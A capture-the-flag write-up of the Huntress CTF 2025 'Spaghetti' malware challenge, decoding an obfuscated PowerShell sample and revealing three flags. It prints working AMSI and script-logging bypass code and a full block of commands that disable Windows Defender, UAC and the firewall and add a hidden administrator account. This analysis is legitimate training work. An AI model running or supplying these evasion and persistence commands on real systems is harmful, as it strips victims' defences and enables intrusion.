# Huntress CTF 2025 -- 🐞 Spaghetti 

- **Team:** r4ph3cks
- **Date:** 02/10/2025

## Challenge Information

- **Category:** 🐞 Malware

- **Description:**
> You know, I've been thinking... at the end of the day, spaghetti is really just strings of pasta!
> Anyway, we saw this weird file running on startup. Can you figure out what this is?
> I'm sure you'll understand the questions below better as you explore!

- **Author:** [John Hammond](https://www.youtube.com/@_JohnHammond)

- **Given:** [spaghetti.zip](https://github.com/r4ph3cks/huntress-ctf-2025/tree/6231ada10f6551d22c718e4842bd58ba4d840f35/spaghetti/assets/spaghetti.zip)

> [!IMPORTANT]
> The ZIP archive password is `infected`

> [!NOTE]
> You may find a public paste URL that is expired. This is an artifact of the original malware sample and is intentional. This URL is not necessary for the challenge.

## Initial Analysis

We started by extracting the zip file with the given password, which contained two files named `spaghetti` and `AYGIW.tmp`. After analyzing both files, we concluded that `spaghetti` is a PowerShell script file and the other is an ASCII file containing an enormous string.

This challenge has three "phases", each requiring a flag. We will start with the first phase.

### MainFileSettings

> **Description:** Uncover the flag within the "main file."

We analyzed the `spaghetti` file by opening it in a text editor. At first, the file contains comments with quotes by famous people and, between them, random calculations whose results are printed. We searched for the string `main` (CTRL+F) and got three results. The first was the following piece of code:

```powershell
$currentDirectory = Get-Location
$fileName = "AYGIW.tmp"
$filePath = Join-Path -Path $currentDirectory -ChildPath $fileName
$MainFileSettings = Get-Content -Path $filePath
```

This code retrieves the content of `AYGIW.tmp` into a variable named `$MainFileSettings`.

The second and third results were the following piece of code:

```powershell
[byte[]]$WULC4 = HombaAmigo($MainFileSettings.replace('WT','00'))
#[byte[]]$WULC4 = HombaAmigo($MainFileSettings.replace('X','00'))
[byte[]]$YIV4Z = HombaAmigo($RunRBTX1)
$OKM4 = (FonatozQZ("%1%%%1%1%1111%%%%11%%1%1%11%%%11%111%1%1%111%1%%%11%%1%1".Replace('%','0')))
$x1ct = (FonatozQZ("0%00%00%0%%0%%%00%%%0%%00%%0%%%%0%%0%0%%0%%00%0%".Replace('%','1')))
$Path   = $newDestination
$Path2  = $Path
$Path3  = ''
```

The first line is the important one: it passes to the `HombaAmigo` function the content of `AYGIW.tmp` with the characters `WT` replaced by `00`. The `HombaAmigo` function is declared several lines before this code. By searching for it we found:

```powershell
Function HombaAmigo([String] $IN) {
    $RunRBTX1 = $IN.Replace('~','000').Replace('%','4')
    $bytes = New-Object -TypeName byte[] -ArgumentList ($RunRBTX1.Length / 1+1+0)
    for ($i = 0; $i -lt $RunRBTX1.Length; $i += 1+1+0) {
        $bytes[$i / 2] = [Convert]::ToByte($RunRBTX1.Substring($i, 1+1+0), 6+10+0)
    }
    return [byte[]]$bytes
}
```

This function replaces characters, then parses the string two characters at a time as hexadecimal digits and returns a byte array. Although PowerShell is cross-platform, we decided to translate the code to Python:

```python
INPUT_FILE = 'AYGIW.tmp'
OUTPUT_FILE = 'decoded_file'

def homba_amigo(input_string):
    run_rbtx1 = input_string.replace('~', '000').replace('%', '4')
    
    bytes_array = bytearray()
    
    for i in range(0, len(run_rbtx1), 2):  # Step by 2
        byte_value = int(run_rbtx1[i:i+2], 16) 
        bytes_array.append(byte_value)
    
    return bytes(bytes_array)

if __name__ == "__main__":
    with open(INPUT_FILE, 'r') as file:
        data = file.read().rstrip()
    
    result = homba_amigo(data.replace('WT','00'))

    with open(OUTPUT_FILE, 'w') as output_file:
        output_file.write(result.decode(errors='ignore'))
```

This Python script implements the same logic as the PowerShell function. The result is decoded to UTF-8 and written to a file. Inspecting the start of the file we saw `L!This program cannot be run in DOS mode.` which indicates that this file is probably a Windows executable. We ran the `strings` command and grepped for "flag":

```bash
$ strings decoded_program | grep flag
```

And got the flag:

```
flag{39544d3b5374ebf7d39b8c260fc4afd8}
```

### My Fourth Oasis

> **Description:** Uncover the flag within "my fourth oasis."

We proceeded as before, searching for similar strings. The "oasis" was easy to find. We found:

```powershell
$MyOasis4 = (FonatozQZ("~%%%~~%%~%%~~~[REDACTED]%~%~~%~~~~%~%~".Replace('~','0').Replace('%','1')))
$MyOasis4 | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
```

We copied that giant string (redacted here) and used our reliable friend [CyberChef](https://cyberchef.io/). We used two substitute recipes to simulate the replace functions at the end of the string and a binary recipe since it is a binary sequence. We obtained a PowerShell script:

```powershell
start-sleep 23
# Disable Script Logging:
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")

# Matt Graeber's reflection method:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Forcing an error:
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)


start-sleep 12
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)


start-sleep 7


$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#102;&#108;&#97;&#103;&#123;&#98;&#51;&#49;&#51;&#55;&#57;&#52;&#100;&#99;&#101;&#102;&#51;&#51;&#53;&#100;&#97;&#54;&#50;&#48;&#54;&#100;&#53;&#52;&#97;&#102;&#56;&#49;&#98;&#54;&#50;&#48;&#51;&#125;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

In short, this script is an obfuscated AMSI bypass with a logging bypass to evade Windows Defender/AV detection. Analyzing further, we saw the following commented block:

```powershell
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#102;&#108;&#97;&#103;&#123;&#98;&#51;&#49;&#51;&#55;&#57;&#52;&#100;&#99;&#101;&#102;&#51;&#51;&#53;&#100;&#97;&#54;&#50;&#48;&#54;&#100;&#53;&#52;&#97;&#102;&#56;&#49;&#98;&#54;&#50;&#48;&#51;&#125;'))")
```

We asked why it was commented out. Could it be the flag? Yes — it was.

Using the already transformed binary string in CyberChef, we added a `From HTML Entity` recipe to convert the numeric character references. After decoding, we found the flag inside the HTML-decoded string.

Flag:

```
flag{b313794dcef335da6206d54af81b6203}
```

### MEMEMAN

> **Description:** Uncover the flag beside "MEMEMAN."

Although this is the last phase, it is simple but not as straightforward as the others. Searching for strings containing `MEMEMAN.` yielded nothing. Neither did the previously uncovered scripts. There was one thing we hadn't examined (Ângelo noticed it). Following the `$MyOasis4` variable there was another one, also with a huge string:

```powershell
$TDefo = (FonatozQZ("~%~~~~~%~%%~~%~~~[REDACTED]~%%~~%%~~~~~%~%~".Replace('~','0').Replace('%','1')))
$TDefo | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
```

We proceeded the same way as with "my fourth oasis", using CyberChef, but this time without the HTML Entity recipe because we didn't know to use it. We obtained the flag right before `MEMEMAN` in the following output:

```powershell
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".ppam"
Add-MpPreference -ExclusionExtension ".xls"
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".vbs"
Add-MpPreference -ExclusionExtension ".js"
Add-MpPreference -ExclusionPath  C:\
Add-MpPreference -ExclusionPath  D:\
Add-MpPreference -ExclusionPath  E:\
Add-MpPreference -ExclusionPath  C:\ProgramData\MEMEMAN\
# Add-MpPreference -ExclusionExtension "flag{60814731f508781b9a5f8636c817af9d}"
Add-MpPreference -ExclusionProcess explorer.exe
Add-MpPreference -ExclusionProcess kernel32.dll
Add-MpPreference -ExclusionProcess aspnet_compiler.exe
Add-MpPreference -ExclusionProcess cvtres.exe
Add-MpPreference -ExclusionProcess CasPol.exe
Add-MpPreference -ExclusionProcess csc.exe
Add-MpPreference -ExclusionProcess Msbuild.exe
Add-MpPreference -ExclusionProcess ilasm.exe
Add-MpPreference -ExclusionProcess InstallUtil.exe
Add-MpPreference -ExclusionProcess jsc.exe
Add-MpPreference -ExclusionProcess Calc.exe
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess rundll32.exe
Add-MpPreference -ExclusionProcess mshta.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess DefenderisasuckingAntivirus
Add-MpPreference -ExclusionProcess wscript.exe
Add-MpPreference -ExclusionIpAddress 127.0.0.1
Add-MpPreference -ThreatIDDefaultAction_Actions 6
Add-MpPreference -AttackSurfaceReductionRules_Ids 0
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8
New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
Stop-Service -Name WinDefend -Confirm:$false -Force
Set-Service -Name WinDefend -StartupType Disabled
net user System32 /add                                                                           
net user System32 123
net localgroup administrators System32 /add
net localgroup "Remote Desktop Users" System32 /add
net stop WinDefend
net stop WdNisSvc
sc delete windefend
netsh advfirewall set allprofiles state off
```

Flag:

```
flag{60814731f508781b9a5f8636c817af9d}
```

## Observations

This challenge is in the malware category. The PowerShell script is a typical malicious file heavily padded with inspirational quotes (Whitman, Emerson, Disney, etc.) as comments and random calculations. This is a way to add noise and make analysis more tedious while the actual malware is hidden in the middle. The script downloads an encoded payload from the web and uses custom decoding, loads the decoded assembly directly in memory (fileless execution), and finally uses `RegSvcs.exe` as a LOLBin disguise to execute the malicious .NET payload.
